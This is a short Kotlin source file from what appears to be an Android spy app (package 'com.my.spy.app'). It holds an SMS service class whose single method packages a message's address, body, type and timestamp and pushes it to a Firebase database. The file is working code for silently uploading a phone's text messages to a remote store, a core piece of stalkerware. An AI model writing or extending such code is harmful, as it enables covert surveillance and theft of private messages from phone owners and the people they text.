package com.my.spy.app.services.sms

import android.content.Context
import com.my.spy.app.data.rxFirebase.InterfaceFirebase
import com.my.spy.app.data.model.Sms
import com.my.spy.app.services.base.BaseInteractorService
import com.my.spy.app.utils.ConstFun.getDateTime
import com.my.spy.app.utils.Consts.DATA
import com.my.spy.app.utils.Consts.SMS
import javax.inject.Inject


class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String,type: Int) {
        val sms = Sms(smsAddress, smsBody, getDateTime(),type)
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms).addOnCompleteListener {
            if (isNullService()) getService()!!.stopServiceSms()
        }
    }

}